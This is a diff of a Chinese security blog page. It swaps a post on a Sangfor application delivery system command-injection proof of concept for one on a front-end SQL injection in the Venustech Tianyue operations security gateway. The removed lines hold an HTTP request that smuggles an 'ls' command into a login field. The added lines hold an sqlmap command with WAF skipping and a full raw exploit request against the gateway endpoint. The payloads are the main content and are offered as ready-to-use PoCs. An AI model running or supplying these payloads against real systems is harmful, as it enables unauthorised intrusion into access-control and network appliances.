@@ -16,23 +16,23 @@
   <meta name="author" content="3xsh0re">
   <meta name="keywords" content="">
   
-    <meta name="description" content="深信服应用交付系统命令执行漏洞POC12POST &#x2F;rep&#x2F;loginHost:10.10.10.1:85clsMode&#x3D;cls_mode_login%0Als%0A&amp;index&#x3D;index&amp;log_type&#x3D;report&amp;loginType&#x3D;account&amp;page&#x3D;login&amp;rnd&#x3D;0&amp;userID&#x3D;admin&amp;userPsw&#x3D;123">
+    <meta name="description" content="天钥安全网关前台sql注入天玥运维安全网关，俗称堡垒机，能够对运维人员维护过程进行全面跟踪、控制、记录、回放；支持细粒度配置运维人员的访问权限，实时阻断违规、越权的访问行为，同时提供维护人员操作的全过程的记录与报告 POC1sqlmap -u &quot;https:&#x2F;&#x2F;****&#x2F;ops&#x2F;index.php?c&#x3D;Reportguide&amp;a&#x3D;checkrn&quot; --data &amp;quo">
 <meta property="og:type" content="article">
-<meta property="og:title" content="深信服设备漏洞">
-<meta property="og:url" content="https://remixxyh.github.io/2023/08/11/%E6%B7%B1%E4%BF%A1%E6%9C%8D%E8%AE%BE%E5%A4%87%E6%BC%8F%E6%B4%9E/index.html">
+<meta property="og:title" content="启明设备漏洞">
+<meta property="og:url" content="https://remixxyh.github.io/2023/08/11/%E5%90%AF%E6%98%8E%E8%AE%BE%E5%A4%87%E6%BC%8F%E6%B4%9E/index.html">
 <meta property="og:site_name" content="3xsh0re">
-<meta property="og:description" content="深信服应用交付系统命令执行漏洞POC12POST &#x2F;rep&#x2F;loginHost:10.10.10.1:85clsMode&#x3D;cls_mode_login%0Als%0A&amp;index&#x3D;index&amp;log_type&#x3D;report&amp;loginType&#x3D;account&amp;page&#x3D;login&amp;rnd&#x3D;0&amp;userID&#x3D;admin&amp;userPsw&#x3D;123">
+<meta property="og:description" content="天钥安全网关前台sql注入天玥运维安全网关，俗称堡垒机，能够对运维人员维护过程进行全面跟踪、控制、记录、回放；支持细粒度配置运维人员的访问权限，实时阻断违规、越权的访问行为，同时提供维护人员操作的全过程的记录与报告 POC1sqlmap -u &quot;https:&#x2F;&#x2F;****&#x2F;ops&#x2F;index.php?c&#x3D;Reportguide&amp;a&#x3D;checkrn&quot; --data &amp;quo">
 <meta property="og:locale" content="zh_CN">
-<meta property="article:published_time" content="2023-08-11T03:59:32.000Z">
-<meta property="article:modified_time" content="2023-08-11T04:02:44.196Z">
+<meta property="article:published_time" content="2023-08-11T01:44:49.000Z">
+<meta property="article:modified_time" content="2023-08-12T02:01:36.360Z">
 <meta property="article:author" content="3xsh0re">
 <meta property="article:tag" content="POC">
-<meta property="article:tag" content="深信服">
+<meta property="article:tag" content="启明">
 <meta name="twitter:card" content="summary_large_image">
   
   
   
-  <title>深信服设备漏洞 - 3xsh0re</title>
+  <title>启明设备漏洞 - 3xsh0re</title>
 
   <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
 
@@ -227,7 +227,7 @@
       <div class="banner-text text-center fade-in-up">
         <div class="h2">
           
-            <span id="subtitle" data-typed-text="深信服设备漏洞"></span>
+            <span id="subtitle" data-typed-text="启明设备漏洞"></span>
           
         </div>
 
@@ -238,8 +238,8 @@
     
       <span class="post-meta">
         <i class="iconfont icon-date-fill" aria-hidden="true"></i>
-        <time datetime="2023-08-11 11:59" pubdate>
-          2023年8月11日 中午
+        <time datetime="2023-08-11 09:44" pubdate>
+          2023年8月11日 上午
         </time>
       </span>
     
@@ -250,7 +250,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          198 字
+          1k 字
         
       </span>
     
@@ -261,7 +261,7 @@
         
         
         
-          2 分钟
+          9 分钟
         
       </span>
     
@@ -306,12 +306,15 @@
       <div class="container nopadding-x-md" id="board-ctn">
         <div id="board">
           <article class="post-content mx-auto">
-            <h1 id="seo-header">深信服设备漏洞</h1>
+            <h1 id="seo-header">启明设备漏洞</h1>
             
             
               <div class="markdown-body">
                 
-                <h3 id="深信服应用交付系统命令执行漏洞"><a href="#深信服应用交付系统命令执行漏洞" class="headerlink" title="深信服应用交付系统命令执行漏洞"></a>深信服应用交付系统命令执行漏洞</h3><h4 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h4><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs http">POST /rep/loginHost:10.10.10.1:85<br>clsMode=cls_mode_login%0Als%0A&amp;index=index&amp;log_type=report&amp;loginType=account&amp;page=login&amp;rnd=0&amp;userID=admin&amp;userPsw=123<br></code></pre></td></tr></table></figure>
+                <h3 id="天钥安全网关前台sql注入"><a href="#天钥安全网关前台sql注入" class="headerlink" title="天钥安全网关前台sql注入"></a>天钥安全网关前台sql注入</h3><p>天玥运维安全网关，俗称堡垒机，能够对运维人员维护过程进行全面跟踪、控制、记录、回放；支持细粒度配置运维人员的访问权限，实时阻断违规、越权的访问行为，同时提供维护人员操作的全过程的记录与报告</p>
+<h4 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">sqlmap -u &quot;https://****/ops/index.php?c=Reportguide&amp;a=checkrn&quot; --data &quot;checkname=123&amp;tagid=123&quot; -v3 --skip-waf --random-agent<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/ops/index.php?c=Reportguide&amp;a=checkrn</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>****<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>close<br><span class="hljs-attribute">Cache-Control</span><span class="hljs-punctuation">: </span>max-age=0<br><span class="hljs-attribute">sec-ch-ua</span><span class="hljs-punctuation">: </span>&quot;Chromium&quot;;v=&quot;88&quot;, &quot;Google Chrome&quot;;v=&quot;88&quot;, &quot;;Not A Brand&quot;;v=&quot;99&quot;<br><span class="hljs-attribute">sec-ch-ua-mobile</span><span class="hljs-punctuation">: </span>?0<br><span class="hljs-attribute">Upgrade-Insecure-Requests</span><span class="hljs-punctuation">: </span>1<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.96 Safari/537.36<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,/;q=0.8,application/signed-exchange;v=b3;q=0.9<br><span class="hljs-attribute">Sec-Fetch-Site</span><span class="hljs-punctuation">: </span>none<br><span class="hljs-attribute">Sec-Fetch-Mode</span><span class="hljs-punctuation">: </span>navigate<br><span class="hljs-attribute">Sec-Fetch-User</span><span class="hljs-punctuation">: </span>?1<br><span class="hljs-attribute">Sec-Fetch-Dest</span><span class="hljs-punctuation">: </span>document<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>zh-CN,zh;q=0.9<br><span class="hljs-attribute">Cookie</span><span class="hljs-punctuation">: </span>****<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/x-www-form-urlencoded<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>39checkname=123&amp;tagid=123<br></code></pre></td></tr></table></figure>
 
                 
               </div>
@@ -347,7 +350,7 @@
       
         <a href="/tags/POC/" class="print-no-link">#POC</a>
       
-        <a href="/tags/%E6%B7%B1%E4%BF%A1%E6%9C%8D/" class="print-no-link">#深信服</a>
+        <a href="/tags/%E5%90%AF%E6%98%8E/" class="print-no-link">#启明</a>
       
     </div>
   
@@ -359,8 +362,8 @@
 
   <div class="license-box my-3">
     <div class="license-title">
-      <div>深信服设备漏洞</div>
-      <div>https://remixxyh.github.io/2023/08/11/深信服设备漏洞/</div>
+      <div>启明设备漏洞</div>
+      <div>https://remixxyh.github.io/2023/08/11/启明设备漏洞/</div>
     </div>
     <div class="license-meta">
       
@@ -404,9 +407,9 @@
                   <article class="post-prev col-6">
                     
                     
-                      <a href="/2023/08/11/%E5%AE%89%E6%81%92%E8%AE%BE%E5%A4%87%E6%BC%8F%E6%B4%9E/" title="安恒设备漏洞">
+                      <a href="/2023/08/11/%E7%BD%91%E7%A5%9E%E9%98%B2%E7%81%AB%E5%A2%99%E6%BC%8F%E6%B4%9E/" title="网神防火墙漏洞">
                         <i class="iconfont icon-arrowleft"></i>
-                        <span class="hidden-mobile">安恒设备漏洞</span>
+                        <span class="hidden-mobile">网神防火墙漏洞</span>
                         <span class="visible-mobile">上一篇</span>
                       </a>
                     
@@ -414,8 +417,8 @@
                   <article class="post-next col-6">
                     
                     
-                      <a href="/2023/08/11/%E7%BD%91%E7%A5%9E%E9%98%B2%E7%81%AB%E5%A2%99%E6%BC%8F%E6%B4%9E/" title="网神防火墙漏洞">
-                        <span class="hidden-mobile">网神防火墙漏洞</span>
+                      <a href="/2023/08/11/Hvv2023_%E9%80%9A%E8%BE%BEOA_sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/" title="Hvv2023_通达OA_sql注入漏洞">
+                        <span class="hidden-mobile">Hvv2023_通达OA_sql注入漏洞</span>
                         <span class="visible-mobile">下一篇</span>
                         <i class="iconfont icon-arrowright"></i>
                       </a>
